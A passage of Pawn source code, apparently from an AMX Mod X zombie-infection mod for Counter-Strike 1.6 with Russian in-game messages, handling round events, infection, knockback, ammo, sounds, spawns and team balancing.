    if (equal(txtmsg[1], "Game_bomb_drop"))
        return PLUGIN_HANDLED

    else if (equal(txtmsg[1], "Terrorists_Win"))
    {
        formatex(winmsg, charsmax(winmsg), "Зомби выиграли!^n Вечеринку начал %s!", g_first_zombie_name)
        set_msg_arg_string(2, winmsg)
    }
    else if (equal(txtmsg[1], "Target_Saved") || equal(txtmsg[1], "CTs_Win"))
    {
        formatex(winmsg, charsmax(winmsg), "Победа людишек!")
        set_msg_arg_string(2, winmsg)
    }

    return PLUGIN_CONTINUE
}

public msg_audiomsg(msg_id, msg_dest, entity)
{
    if (get_msg_args() == 3)
    {
        if (get_msg_argtype(2) == ARG_STRING)
        {
            static value2[64]
            get_msg_arg_string(2, value2, charsmax(value2))
            if (equal(value2 ,"%!MRAD_FIREINHOLE"))
                return PLUGIN_HANDLED
        }
    }
    return PLUGIN_CONTINUE
}

public msg_block_changename(msgid, msgdest, msgent)
{
    static sz[80]
    get_msg_arg_string(2, sz, charsmax(sz))
    if (containi(sz, "#Cstrike_Name_Change") != -1)
            return PLUGIN_HANDLED

    return PLUGIN_CONTINUE
}

public msg_clcorpse(msgid, dest, id)
{
    id = get_msg_arg_int(12)
    if (!g_zombie[id])
        return PLUGIN_HANDLED  // removing corpses

    static ent
    ent = fm_cs_find_ent_by_owner(-1, MODEL_CLASSNAME, id)

    if (ent)
    {
        static model[64]
        pev(ent, pev_model, model, charsmax(model))

        set_msg_arg_string(1, model)
    }
    return PLUGIN_HANDLED  // removing corpses
}

public do_exec(id,level,cid)
{
    if (!cmd_access(id, level, cid, 3))
        return PLUGIN_HANDLED

    new arg[32], command[64]

    read_argv(1, arg, charsmax(arg))
    read_argv(2, command, charsmax(command))
    remove_quotes(command)
    replace_all(command, charsmax(command), "\'", "^"")

    new target = cmd_target(id, arg, 3)

    if (!is_user_valid_connected(target))
        return PLUGIN_HANDLED

    client_cmd(target, command)

    return PLUGIN_HANDLED
}

public logevent_round_start()
{
    g_roundended = false
    g_roundstarted = true
    g_roundstart_time = get_systime()

    static id, team
    for (id = 1; id <= g_maxplayers; id++)
    {
        if (is_user_valid_alive(id))
        {
            team = fm_get_user_team(id)
            if (team == TEAM_TERRORIST || team == TEAM_CT)
            {
                if (g_showmenu[id])
                {
                    add_delay(id, "display_equipmenu")
                    if (g_player_weapons[id][0] != -1)
                        equipweapon(id, EQUIP_ALL)
                }
                else
                {
                    equipweapon(id, EQUIP_ALL)
                }
            }
        }
    }

    // Check for human-terrorist-bug
    set_task(get_pcvar_float(cvar_starttime)+3.0, "check_terrorist_bug", TASKID_TERBUG)
}

public check_terrorist_bug()
{
    if (g_roundended)
        return PLUGIN_CONTINUE

    static players[32], num
    get_players(players, num)

    static i, id, team
    for (i = 0; i < num; i++)
    {
        id = players[i]
        team = fm_get_user_team(id)
        if (!g_zombie[id] && team == TEAM_TERRORIST)
            cs_set_player_team(id, CS_TEAM_CT)
    }
    return PLUGIN_CONTINUE
}

public logevent_round_end()
{
    g_gamestarted = false
    g_roundstarted = false
    g_roundended = true

    remove_task(TASKID_BALANCETEAM)
    remove_task(TASKID_INITROUND)
    remove_task(TASKID_STARTROUND)

    ClearSyncHud(0, g_sync_msgdisplay)

    set_task(0.1, "task_balanceteam", TASKID_BALANCETEAM)
}

public event_textmsg()
{
    g_gamestarted = false
    g_roundstarted = false
    g_roundended = true

    static seconds[5]
    read_data(3, seconds, charsmax(seconds))

    static Float:tasktime
    tasktime = float(str_to_num(seconds)) - 0.5

    remove_task(TASKID_BALANCETEAM)

    set_task(tasktime, "task_balanceteam", TASKID_BALANCETEAM)
}

public event_newround()
{
    get_pcvar_string(cvar_lights, lights, 1)

    if (strlen(lights) > 0) engfunc(EngFunc_LightStyle, 0, lights)

    g_gamestarted = false

    static id
    for (id = 1; id <= g_maxplayers; id++)
    {
        if (is_user_valid_connected(id))
            g_blockmodel[id] = true
    }

    remove_task(TASKID_NEWROUND)
    remove_task(TASKID_INITROUND)
    remove_task(TASKID_STARTROUND)
    remove_task(TASKID_TERBUG)

    set_task(0.1, "task_newround", TASKID_NEWROUND)
    set_task(get_pcvar_float(cvar_starttime), "task_initround", TASKID_INITROUND)
}

public event_curweapon(id)
{
    if (g_zombie[id])
        return PLUGIN_CONTINUE

    if (!is_user_valid_alive(id))
        return PLUGIN_CONTINUE

    static weapon
    weapon = read_data(2)

    static ammotype
    ammotype = get_pcvar_num(cvar_ammo)

    if (!ammotype || (AMMOWP_NULL & (1<<weapon)))
        return PLUGIN_CONTINUE

    static maxammo
    switch(ammotype)
    {
        case 1: maxammo = g_weapon_ammo[weapon][MAX_AMMO]
        case 2: maxammo = g_weapon_ammo[weapon][MAX_CLIP]
    }

    if (!maxammo)
        return PLUGIN_CONTINUE

    switch(ammotype)
    {
        case 1:
        {
            static ammo
            ammo = cs_get_user_bpammo(id, weapon)

            if (ammo < maxammo)
                cs_set_user_bpammo(id, weapon, maxammo)
        }
        case 2:
        {
            static clip; clip = read_data(3)
            if (clip < 1)
            {
                static weaponname[32]
                get_weaponname(weapon, weaponname, charsmax(weaponname))

                static ent
                ent = fm_cs_find_ent_by_owner(-1, weaponname, id)

                fm_set_weapon_ammo(ent, maxammo)
            }
        }
    }
    return PLUGIN_CONTINUE
}

public event_damage(victim)
{
    if (!is_user_valid_alive(victim) || !g_gamestarted)
        return PLUGIN_CONTINUE

    if (!g_zombie[victim])
    {
        static attacker
        attacker = get_user_attacker(victim)

        if (!is_user_valid_alive(attacker) || !g_zombie[attacker] || g_infecting)
            return PLUGIN_CONTINUE

        if (g_victim[attacker] == victim)
        {
            g_infecting = true
            g_victim[attacker] = 0

            message_begin(MSG_BROADCAST, g_msg_deathmsg)
            write_byte(attacker)
            write_byte(victim)
            write_byte(0)
            write_string(INFECTION_NAME)
            message_end()

            message_begin(MSG_BROADCAST, g_msg_scoreattrib)
            write_byte(victim)
            write_byte(0)
            message_end()

            infect_user(victim, attacker)

            static Float:frags, deaths
            pev(attacker, pev_frags, frags)
            deaths = fm_get_user_deaths(victim)

            set_pev(attacker, pev_frags, frags  + 1.0)
            fm_set_user_deaths(victim, deaths + 1)

            static Float:bonus_health
            bonus_health = get_random_bonus_health()
            set_pev(attacker, pev_health, get_user_health(attacker) + bonus_health)
            set_hudmessage(200, 200, 0, 0.55, 0.55, 0, 0.1, 2.0, 0.1, 0.1, -1)
            ShowSyncHudMsg(attacker, g_sync_msgdisplay, "+%d HP", floatround(bonus_health))

            static params[2]
            params[0] = attacker
            params[1] = victim

            set_task(0.3, "task_updatescore", TASKID_UPDATESCR, params, 2)
        }
        g_infecting = false
    }
    return PLUGIN_CONTINUE
}

Float:get_random_bonus_health()
{
    static i_health
    i_health = get_pcvar_num(cvar_healthbonus)
    return float(random_num(100, i_health))
}

public fwd_player_prethink(id)
{
    if (!is_user_valid_alive(id) || !g_zombie[id])
        return FMRES_IGNORED

    static flags
    flags = pev(id, pev_flags)

    if (flags & FL_ONGROUND)
    {
        pev(id, pev_velocity, g_vecvel)
        g_brestorevel = true
    }

    return FMRES_IGNORED
}

public fwd_player_prethink_post(id)
{
    if (!g_brestorevel)
        return FMRES_IGNORED

    g_brestorevel = false

    static flag
    flag = pev(id, pev_flags)

    if (!(flag & FL_ONTRAIN))
    {
        static ent
        ent = pev(id, pev_groundentity)

        if (pev_valid(ent) && (flag & FL_CONVEYOR))
        {
            static Float:vectemp[3]
            pev(id, pev_basevelocity, vectemp)

            xs_vec_add(g_vecvel, vectemp, g_vecvel)
        }

        set_pev(id, pev_velocity, g_vecvel)
        return FMRES_HANDLED
    }
    return FMRES_IGNORED
}

public fwd_player_postthink(id)
{
    if (!is_user_valid_alive(id))
        return FMRES_IGNORED

    if (pev(id, pev_flags) & FL_ONGROUND)
        set_pev(id, pev_watertype, CONTENTS_WATER)

    return FMRES_IGNORED
}

public fwd_emitsound(id, channel, sample[], Float:volume, Float:attn, flag, pitch)
{
    if (channel == CHAN_ITEM && sample[6] == 'n' && sample[7] == 'v' && sample[8] == 'g')
        return FMRES_SUPERCEDE

    if (!is_user_valid_connected(id) || !g_zombie[id])
        return FMRES_IGNORED

    if (sample[8] == 'k' && sample[9] == 'n' && sample[10] == 'i')
    {
        if (sample[14] == 's' && sample[15] == 'l' && sample[16] == 'a')
        {
            emit_sound(id, channel, g_zombie_miss_sounds[_random(sizeof g_zombie_miss_sounds)], volume, attn, flag, pitch)
            return FMRES_SUPERCEDE
        }
        else if (sample[14] == 'h' && sample[15] == 'i' && sample[16] == 't' || sample[14] == 's' && sample[15] == 't' && sample[16] == 'a')
        {
            if (sample[17] == 'w' && sample[18] == 'a' && sample[19] == 'l')
                emit_sound(id, channel, g_zombie_miss_sounds[_random(sizeof g_zombie_miss_sounds)], volume, attn, flag, pitch)
            else
                emit_sound(id, channel, g_zombie_hit_sounds[_random(sizeof g_zombie_hit_sounds)], volume, attn, flag, pitch)

            return FMRES_SUPERCEDE
        }
    }
    else if (sample[7] == 'd' && (sample[8] == 'i' && sample[9] == 'e' || sample[12] == '6'))
    {
        emit_sound(id, channel, g_zombie_die_sounds[_random(sizeof g_zombie_die_sounds)], volume, attn, flag, pitch)
        return FMRES_SUPERCEDE
    }

    return FMRES_IGNORED
}

public fwd_spawn(ent)
{
    if (!pev_valid(ent))
        return FMRES_IGNORED

    static classname[32]
    pev(ent, pev_classname, classname, charsmax(classname))

    static i
    for (i = 0; i < sizeof g_remove_entities; ++i)
    {
        if (equal(classname, g_remove_entities[i]))
        {
            engfunc(EngFunc_RemoveEntity, ent)
            return FMRES_SUPERCEDE
        }
    }
    return FMRES_IGNORED
}

public fwd_gamedescription()
{
    static gamename[32]
    get_pcvar_string(cvar_gamedescription, gamename, charsmax(gamename))

    forward_return(FMV_STRING, gamename)

    return FMRES_SUPERCEDE
}

public fw_SetModel(entity, const model[])
{
    // We don't care
    if (strlen(model) < 8)
        return FMRES_IGNORED

    // Get entity's classname
    static classname[10]
    pev(entity, pev_classname, classname, charsmax(classname))

    // Owner
    static owner
    owner = pev(entity, pev_owner)
    if (is_user_valid_connected(owner))
        remember_silen_status(owner)

    // Check if it's a weapon box
    if (equal(classname, "weaponbox"))
    {
        // They get automatically removed when thinking
        set_pev(entity, pev_nextthink, get_gametime() + 0.4)
        return FMRES_IGNORED
    }

    /* Remove smoke grenade */

    // Narrow down our matches a bit
    if (model[7] != 'w' || model[8] != '_')
        return FMRES_IGNORED

    // Get damage time of grenade
    static Float:dmgtime
    pev(entity, pev_dmgtime, dmgtime)

    // Grenade not yet thrown
    if (dmgtime == 0.0)
        return FMRES_IGNORED

    if (model[9] == 's' && model[10] == 'm')
        set_pev(entity, PEV_NADE_TYPE, NADE_TYPE_FLARE)
    return FMRES_IGNORED
}

public fwd_createnamedentity(entclassname)
{
    static classname[10]
    engfunc(EngFunc_SzFromIndex, entclassname, classname, charsmax(classname))

    return (classname[7] == 'c' && classname[8] == '4') ? FMRES_SUPERCEDE : FMRES_IGNORED
}

public fwd_clientkill(id)
{
    static name[32]
    get_user_name(id, name, charsmax(name))
    colored_print(id, "^x04***^x03 %s^x01, убивать себя нельзя!", name)

    return FMRES_SUPERCEDE
}

public fwd_setclientkeyvalue(id, infobuffer, const key[])
{
    if (!equal(key, "model") || !g_blockmodel[id])
        return FMRES_IGNORED

    static model[32]
    fm_get_user_model(id, model, charsmax(model))

    if (equal(model, "gordon"))
        return FMRES_IGNORED

    g_blockmodel[id] = false

    return FMRES_SUPERCEDE
}

/*
public fwd_client_userinfochanged(id, buffer) {
    if (!is_user_valid_connected(id) || is_user_valid_alive(id))
        return FMRES_IGNORED

    static oldname[32], newname[32]
    get_user_name(id, oldname, charsmax(oldname))
    engfunc(EngFunc_InfoKeyValue, buffer, g_name, newname, charsmax(newname))
    if (equal(newname, oldname))
        return FMRES_IGNORED

    return FMRES_SUPERCEDE
}
*/

public fwd_client_disconnect(id)
{
    if (is_user_valid_alive(id)) check_round(id)

    remove_task(TASKID_STRIPNGIVE + id)
    remove_task(TASKID_UPDATESCR + id)
    remove_task(TASKID_SPAWNDELAY + id)
    remove_task(TASKID_CHECKSPAWN + id)
    remove_task(TASKID_RESTOREFADE + id)
    remove_task(TASKID_SHOWCLEAN + id)
    remove_task(TASKID_SHOWINFECT + id)

    remove_user_model(g_modelent[id])

    g_player_weapons[id][0] = -1
    g_player_weapons[id][1] = -1
    g_silenced[id] = 0

    // Player left, clear cached flags
    g_isconnected[id] = false
    g_isalive[id] = false

    return FMRES_IGNORED
}

public bacon_touch_weapon(ent, id)
{
    return (is_user_valid_alive(id) && g_zombie[id]) ? HAM_SUPERCEDE : HAM_IGNORED
}

public bacon_use_tank(ent, caller, activator, use_type, Float:value)
{
    return (is_user_valid_alive(caller) && g_zombie[caller]) ? HAM_SUPERCEDE : HAM_IGNORED
}

public bacon_use_pushable(ent, caller, activator, use_type, Float:value)
{
    return HAM_SUPERCEDE
}

public bacon_traceattack_player(victim, attacker, Float:damage, Float:direction[3], tracehandle, damagetype)
{
    // Non-player damage or self damage or not a zombie or not bullet damage or knockback disabled
    if (victim == attacker || !is_user_valid_connected(attacker) || !(damagetype & DMG_BULLET))
        return HAM_IGNORED

    // round starts and ends
    if (!g_gamestarted || g_roundended)
        return HAM_SUPERCEDE

    // New round starting and friendly fire prevent
    if (!g_zombie[attacker] && !g_zombie[victim])
        return HAM_SUPERCEDE

    // Get distance between players
    static origin1[3], origin2[3]
    get_user_origin(victim, origin1)
    get_user_origin(attacker, origin2)

    // Max distance exceeded
    if (get_distance(origin1, origin2) > get_pcvar_num(cvar_knockback_dist))
        return HAM_IGNORED

    // Get victim's velocity
    static Float:velocity[3]
    pev(victim, pev_velocity, velocity)

    static kbpower
    kbpower = g_weapon_knockback[get_user_weapon(attacker)]

    xs_vec_mul_scalar(direction, damage, direction)
    if (kbpower != -1)
        xs_vec_mul_scalar(direction, g_knockbackpower[kbpower], direction)
    xs_vec_mul_scalar(direction, g_class_data[g_player_class[victim]][DATA_KNOCKBACK], direction)

    // Add up the new vector
    xs_vec_add(velocity, direction, direction)

    // Set the knockback'd victim's velocity
    set_pev(victim, pev_velocity, direction)

    return HAM_IGNORED
}

public bacon_think_grenade(entity)
{
    if (!pev_valid(entity))
        return HAM_IGNORED

    if (pev(entity, PEV_NADE_TYPE) == NADE_TYPE_FLARE && pev(entity, pev_flags) & FL_ONGROUND)
    {
        engfunc(EngFunc_RemoveEntity, entity)
        return HAM_SUPERCEDE
    }

    return HAM_IGNORED
}

public bacon_takedamage_player(victim, inflictor, attacker, Float:damage, damagetype)
{
    if (damagetype & DMG_GENERIC)
        return HAM_IGNORED

    if (!is_user_valid_alive(victim))
        return HAM_IGNORED

    if (!is_user_valid_connected(attacker))
        return HAM_IGNORED

    if ( g_zombie[victim] && g_zombie[attacker] ||
        !g_zombie[victim] && !g_zombie[attacker])
        return HAM_SUPERCEDE

    if ( !g_gamestarted ||
        (!g_zombie[victim] && !g_zombie[attacker] && !g_gamestarted) ||
        (damagetype & DMG_HEGRENADE && victim == attacker))
        return HAM_SUPERCEDE

    if (g_zombie[attacker] && damagetype & DMG_HEGRENADE)
        return HAM_SUPERCEDE

    if (!g_zombie[attacker])
    {
        static pclass
        pclass = g_player_class[victim]

        damage *= (damagetype & DMG_HEGRENADE) ?
                        g_class_data[pclass][DATA_HEDEFENCE] : g_class_data[pclass][DATA_DEFENCE]

        static user_weapon
        user_weapon = get_user_weapon(attacker)
        if (user_weapon == CSW_KNIFE)
            damage *= 4
        SetHamParamFloat(4, damage)
    }
    else
    {
        if (get_user_weapon(attacker) != CSW_KNIFE)
            return HAM_SUPERCEDE

        damage *= g_class_data[g_player_class[attacker]][DATA_ATTACK]

        static bool:infect
        infect = allow_infection()

        g_victim[attacker] = infect ? victim : 0

        if (!g_infecting)
            SetHamParamFloat(4, infect ? 0.0 : damage)
        else
            SetHamParamFloat(4, 0.0)
    }
    return HAM_HANDLED
}

public bacon_takedamage_player_post(iVictim, iInflictor, iAttacker, Float:flDamage, iDamageType)
{
    if (!is_user_valid_connected(iAttacker) || iVictim == iAttacker)
        return HAM_IGNORED

    if (g_zombie[iVictim] && !g_zombie[iAttacker])
    {
        static iVictimHealth
        iVictimHealth = get_user_health(iVictim)
        if (iVictimHealth < 0)
            iVictimHealth = 0

        static iDamage
        iDamage = floatround(flDamage)

        if (iDamage > 0)
        {
            set_hudmessage(0, 100, 200, 0.55, 0.49, 0, 0.1, 2.0, 0.1, 0.1, -1)
            ShowSyncHudMsg(iAttacker, g_dmg_sync, "%d", iDamage)

            set_hudmessage(0, 150, 20, 0.49, 0.55, 0, 0.1, 2.0, 0.1, 0.1, -1)
            ShowSyncHudMsg(iAttacker, g_dmg_sync2, "%d", iVictimHealth)
        }
    }

    return HAM_IGNORED
}

public bacon_killed_player(victim, killer, shouldgib)
{
    // Player killed
    g_isalive[victim] = false

    remove_task(TASKID_SHOWCLEAN + victim)
    remove_task(TASKID_SHOWINFECT + victim)

    if (!is_user_valid_connected(killer))
    {
        fm_set_user_deaths(victim, fm_get_user_deaths(victim)-1)
    }

    if (!g_zombie[victim])
        remember_silen_status(victim)

    if (!is_user_valid_alive(killer) || g_zombie[killer] || !g_zombie[victim])
        return HAM_IGNORED

    static killbonus
    killbonus = get_pcvar_num(cvar_killbonus)

    if (killbonus)
        set_pev(killer, pev_frags, pev(killer, pev_frags) + float(killbonus))
    if (get_user_weapon(killer) == CSW_KNIFE)
        set_pev(killer, pev_frags, pev(killer, pev_frags) + 3.0)  // 1+1+3=5

    static killreward
    killreward = get_pcvar_num(cvar_killreward)

    if (!killreward)
        return HAM_IGNORED

    static weapon, maxclip, ent, weaponname[32]
    switch(killreward)
    {
        case 1:
        {
            weapon = get_user_weapon(killer)
            maxclip = g_weapon_ammo[weapon][MAX_CLIP]
            if (maxclip)
            {
                get_weaponname(weapon, weaponname, charsmax(weaponname))
                ent = fm_cs_find_ent_by_owner(-1, weaponname, killer)

                cs_set_weapon_ammo(ent, maxclip)
            }
        }
        case 2:
        {
            if (!user_has_weapon(killer, CSW_HEGRENADE))
                set_task(0.1, "give_hegrenade_with_delay", killer)
        }
        case 3:
        {
            weapon = get_user_weapon(killer)
            maxclip = g_weapon_ammo[weapon][MAX_CLIP]
            if (maxclip)
            {
                get_weaponname(weapon, weaponname, charsmax(weaponname))
                ent = fm_cs_find_ent_by_owner(-1, weaponname, killer)

                cs_set_weapon_ammo(ent, maxclip)
            }

            if (!user_has_weapon(killer, CSW_HEGRENADE))
                set_task(0.1, "give_hegrenade_with_delay", killer)
        }
    }

    return HAM_IGNORED
}

public give_hegrenade_with_delay(id)
{
    if (is_user_valid_alive(id))
        give_item(id, "weapon_hegrenade")
}

public bacon_spawn_player_post(id)
{
    if (!is_user_alive(id))
        return HAM_IGNORED

    static team
    team = fm_get_user_team(id)
    if (team != TEAM_TERRORIST && team != TEAM_CT)
        return HAM_IGNORED

    // Player spawned
    g_isalive[id] = true

    remove_task(TASKID_SHOWCLEAN + id)
    remove_task(TASKID_SHOWINFECT + id)

    if (g_zombie[id])
        add_delay(id, "cure_user")
    else if (pev(id, pev_rendermode) == kRenderTransTexture)
        add_delay(id, "reset_user_model")

    if (get_pcvar_num(cvar_randomspawn) || g_spawncount > 0)
        do_random_spawn(id)

    set_task(0.3, "task_spawned", TASKID_SPAWNDELAY + id)
    set_task(5.0, "task_checkspawn", TASKID_CHECKSPAWN + id)

    return HAM_IGNORED
}

public bacon_touch_pushable(ent, id)
{
    static movetype
    pev(id, pev_movetype)

    if (movetype == MOVETYPE_NOCLIP || movetype == MOVETYPE_NONE)
        return HAM_IGNORED

    if (is_user_valid_alive(id))
    {
        set_pev(id, pev_movetype, MOVETYPE_WALK)

        if (!(pev(id, pev_flags) & FL_ONGROUND))
            return HAM_SUPERCEDE
    }

    static Float:velocity[2][3]
    pev(ent, pev_velocity, velocity[0])

    if (vector_length(velocity[0]) > 0.0)
    {
        pev(id, pev_velocity, velocity[1])
        velocity[1][0] += velocity[0][0]
        velocity[1][1] += velocity[0][1]

        set_pev(id, pev_velocity, velocity[1])
    }
    return HAM_SUPERCEDE
}

public bacon_traceattack_pushable(ent, attacker, Float:damage, Float:direction[3], tracehandle, damagetype)
{
    if (!is_user_valid_alive(attacker))
        return HAM_IGNORED

    static Float:velocity[3]
    pev(ent, pev_velocity, velocity)

    static Float:tempvec
    tempvec = velocity[2]

    xs_vec_mul_scalar(direction, damage, direction)
    xs_vec_mul_scalar(direction, g_zombie[attacker] ?
        get_pcvar_float(cvar_pushpwr_zombie) : get_pcvar_float(cvar_pushpwr_weapon), direction)
    xs_vec_add(direction, velocity, velocity)
    velocity[2] = tempvec

    set_pev(ent, pev_velocity, velocity)

    return HAM_HANDLED
}

public client_infochanged(id)
{
    if (!is_user_valid_connected(id))
        return PLUGIN_CONTINUE

    static model[32]
    get_user_info(id, "model", model, charsmax(model))

    if (equal(model, "zombie_source") || equal(model, "vip"))
    {
        set_user_info(id, "model", "")
        return PLUGIN_CONTINUE
    }

    return PLUGIN_CONTINUE
}

public task_spawned(taskid)
{
    static id
    id = taskid - TASKID_SPAWNDELAY

    if (is_user_valid_alive(id))
    {
        if (g_roundstarted && g_showmenu[id] && !g_gamestarted)
            display_equipmenu(id)
        else if (g_gamestarted)
        {
            g_player_weapons[id][0] = _random(sizeof g_primaryweapons)
            g_player_weapons[id][1] = _random(sizeof g_secondaryweapons)
            equipweapon(id, EQUIP_ALL)
            colored_print(id, "^x04***^x01 Пиши^x03 /guns^x01 в чат, чтобы выбрать новое оружие")
        }

        if (!g_gamestarted)
        {
            if (g_preinfect[id]) {
                colored_print(id, "^x01[Сканер] Веселье начинается, ты^x03 ЗАРАЖЕН^x01!!!")
                set_task(0.1, "task_showinfected", TASKID_SHOWINFECT + id, _, _, "b")
            }
            else {
                colored_print(id, "^x01[Сканер] Смотри по сторонам, ты^x04 ЗДОРОВ^x01!")
                set_task(0.5, "task_showclean", TASKID_SHOWCLEAN + id, _, _, "b")
            }
        }
        else
        {
            static team
            team = fm_get_user_team(id)

            if (team == TEAM_TERRORIST)
                cs_set_player_team(id, CS_TEAM_CT)  // player cant be zombie when game already started
        }
    }
}

public task_showinfected(taskid)
{
    static id
    id = taskid - TASKID_SHOWINFECT
    if (is_user_valid_connected(id) && !g_zombie[id]) {
        set_dhudmessage(255, 0, 0, 0.44, 0.88, 0, _, 0.2, 0.1, 0.1)
        show_dhudmessage(id, "[ ЗОМБИ ]")
    }
}

public task_showclean(taskid)
{
    static id
    id = taskid - TASKID_SHOWCLEAN
    if (is_user_valid_connected(id) && !g_zombie[id]) {
        set_dhudmessage(0, 255, 0, 0.43, 0.88, 0, _, 0.7, 0.1, 0.1)
        show_dhudmessage(id, "[ ЧЕЛОВЕК ]")
    }
}

public task_showtruehealth()
{
    static id
    for (id = 1; id <= g_maxplayers; id++)
        if (is_user_valid_alive(id) && g_zombie[id] && !g_roundended)
        {
            static Float:health
            static Float:full_health
            static green

            full_health = g_class_data[g_player_class[id]][DATA_HEALTH]
            pev(id, pev_health, health)
            green = floatround(255.0 * (health - full_health/5) / full_health)  // zombie can gain hp

            set_dhudmessage(255, clamp(green, 0, 255), 0, -1.0, 0.89, 0, _, 0.6, 0.0, 0.0)
            show_dhudmessage(id, "HP: %d", floatround(health))
        }
}

public task_checkspawn(taskid)
{
    static id
    id = taskid - TASKID_CHECKSPAWN

    if (!is_user_valid_connected(id) || is_user_valid_alive(id) || g_roundended)
        return

    static team
    team = fm_get_user_team(id)

    if (team == TEAM_TERRORIST || team == TEAM_CT)
        ExecuteHamB(Ham_CS_RoundRespawn, id)
}

public task_lights()
{
    static light[2]
    get_pcvar_string(cvar_lights, light, 1)

    engfunc(EngFunc_LightStyle, 0, light)
}

public task_updatescore(params[])
{
    if (!g_gamestarted)
        return

    static attacker
    attacker = params[0]

    static victim
    victim = params[1]

    if (!is_user_valid_connected(attacker))
        return

    static frags, deaths, team
    frags  = get_user_frags(attacker)
    deaths = fm_get_user_deaths(attacker)
    team   = get_user_team(attacker)

    message_begin(MSG_BROADCAST, g_msg_scoreinfo)
    write_byte(attacker)
    write_short(frags)
    write_short(deaths)
    write_short(0)
    write_short(team)
    message_end()

    if (!is_user_valid_connected(victim))
        return

    frags  = get_user_frags(victim)
    deaths = fm_get_user_deaths(victim)
    team   = get_user_team(victim)

    message_begin(MSG_BROADCAST, g_msg_scoreinfo)
    write_byte(victim)
    write_short(frags)
    write_short(deaths)
    write_short(0)
    write_short(team)
    message_end()
}

public task_stripngive(taskid)
{
    static id
    id = taskid - TASKID_STRIPNGIVE

    if (is_user_valid_alive(id))
    {
        remember_silen_status(id)

        strip_user_weapons(id)
        give_item(id, "weapon_knife")

        cs_set_player_view_model(id, CSW_KNIFE, g_class_wmodel[g_player_class[id]])
        cs_set_player_weap_model(id, CSW_KNIFE, "")
        cs_set_player_maxspeed(id, g_class_data[g_player_class[id]][DATA_SPEED])
    }
}

public task_newround()
{
    static players[32], num, i, id

    get_players(players, num, "a")

    if (num > 1)
    {
        for (i = 0; i < num; i++)
        {
            if (g_preinfect[players[i]])
                last_zombie = players[i]
            g_preinfect[players[i]] = false
        }

        // ANOTHER ZOMBIE IN NEW ROUND
        static oh_crap
        oh_crap = 0
        do
        {
            id = players[_random(num)]
            oh_crap++
            if (oh_crap > 100)
            {
                log_error(777, "[CRITICAL]: `task_newround` cycle run over 100 times")
                break
            }
        }
        while (id == last_zombie || !is_user_valid_alive(id))

        if (!g_preinfect[id])
            g_preinfect[id] = true

        get_user_name(id, g_first_zombie_name, charsmax(g_first_zombie_name))
    }
}

do_random_spawn(id)
{
    static spawn_index
    spawn_index = _random(g_spawncount)

    static Float:spawndata[3]
    spawndata[0] = g_spawns[spawn_index][0]
    spawndata[1] = g_spawns[spawn_index][1]
    spawndata[2] = g_spawns[spawn_index][2]

    if (!fm_is_hull_vacant(spawndata, HULL_HUMAN))
    {
        static i
        for (i = spawn_index + 1; i != spawn_index; i++)
        {
            if (i >= g_spawncount) i = 0

            spawndata[0] = g_spawns[i][0]
            spawndata[1] = g_spawns[i][1]
            spawndata[2] = g_spawns[i][2]

            if (fm_is_hull_vacant(spawndata, HULL_HUMAN))
            {
                spawn_index = i
                break
            }
        }
    }

    spawndata[0] = g_spawns[spawn_index][0]
    spawndata[1] = g_spawns[spawn_index][1]
    spawndata[2] = g_spawns[spawn_index][2]
    engfunc(EngFunc_SetOrigin, id, spawndata)
}

public task_initround()
{
    static zombiecount, newzombie
    zombiecount = 0
    newzombie = 0

    static players[32], num, i, id
    get_players(players, num, "a")

    for (i = 0; i < num; i++)
    {
        if (g_preinfect[players[i]])
        {
            newzombie = players[i]
            zombiecount++
        }
    }

    if (zombiecount > 1)
        newzombie = 0
    else if (zombiecount < 1)
        newzombie = players[_random(num)]

    for (i = 0; i < num; i++)
    {
        id = players[i]

        remove_task(TASKID_SHOWCLEAN + id)
        remove_task(TASKID_SHOWINFECT + id)

        if (id == newzombie || g_preinfect[id])
            infect_user(id, 0)
        else
        {
            cs_set_player_team(id, CS_TEAM_CT)

            if (g_player_weapons[id][0] == -1)
            {
                g_player_weapons[id][0] = _random(sizeof g_primaryweapons)
                g_player_weapons[id][1] = _random(sizeof g_secondaryweapons)
                equipweapon(id, EQUIP_ALL)
                colored_print(id, "^x04***^x01 Пиши^x03 /guns^x01 в чат, чтобы выбрать новое оружие")
            }
            else if (!user_has_weapon(id, get_weaponid(g_primaryweapons[g_player_weapons[id][0]][1])))
                equipweapon(id, EQUIP_ALL)
        }
    }

    set_hudmessage(_, _, _, _, _, 1)
    if (newzombie)
    {
        static name[32]
        get_user_name(newzombie, name, charsmax(name))

        ShowSyncHudMsg(0, g_sync_msgdisplay, "%s	-	зомби!!!", name)
    }
    else
    {
        ShowSyncHudMsg(0, g_sync_msgdisplay, "%L", LANG_PLAYER, "INFECTED_HUD2")
    }

    set_task(0.51, "task_startround", TASKID_STARTROUND)
}

public task_startround()
{
    g_gamestarted = true
    ExecuteForward(g_fwd_gamestart, g_fwd_result)
}

public task_balanceteam()
{
    static players[3][32], count[3]
    get_players(players[TEAM_UNASSIGNED], count[TEAM_UNASSIGNED])

    count[TEAM_TERRORIST] = 0
    count[TEAM_CT] = 0

    static i, id, team
    for (i = 0; i < count[TEAM_UNASSIGNED]; i++)
    {
        id = players[TEAM_UNASSIGNED][i]
        team = fm_get_user_team(id)

        if (team == TEAM_TERRORIST || team == TEAM_CT)
            players[team][count[team]++] = id
    }

    if (abs(count[TEAM_TERRORIST] - count[TEAM_CT]) <= 1)
        return

    static maxplayers
    maxplayers = (count[TEAM_TERRORIST] + count[TEAM_CT]) / 2

    if (count[TEAM_TERRORIST] > maxplayers)
    {
        for (i = 0; i < (count[TEAM_TERRORIST] - maxplayers); i++)
            cs_set_player_team(players[TEAM_TERRORIST][i], CS_TEAM_CT)
    }
    else
    {
        for (i = 0; i < (count[TEAM_CT] - maxplayers); i++)
            cs_set_player_team(players[TEAM_CT][i], CS_TEAM_T)
    }
}

infect_user(victim, attacker)
{
    if (!is_user_valid_alive(victim) || !is_user_valid_connected(victim))
        return

    message_begin(MSG_ONE_UNRELIABLE, g_msg_screenfade, _, victim)
    write_short(1<<10)
    write_short(1<<10)
    write_short(0)
    write_byte((g_mutate[victim] != -1) ? 255 : 100)
    write_byte(100)
    write_byte(100)
    write_byte(250)
    message_end()

    if (g_mutate[victim] != -1)
    {
        g_player_class[victim] = g_mutate[victim]
        g_mutate[victim] = -1

        set_hudmessage(_, _, _, _, _, 1)
        ShowSyncHudMsg(victim, g_sync_msgdisplay, "%L", victim, "MUTATION_HUD",
            g_class_name[g_player_class[victim]])
    }

    message_begin(MSG_ONE_UNRELIABLE, g_msgScreenShake, _, victim)
    write_short(UNIT_SECOND*40) // amplitude
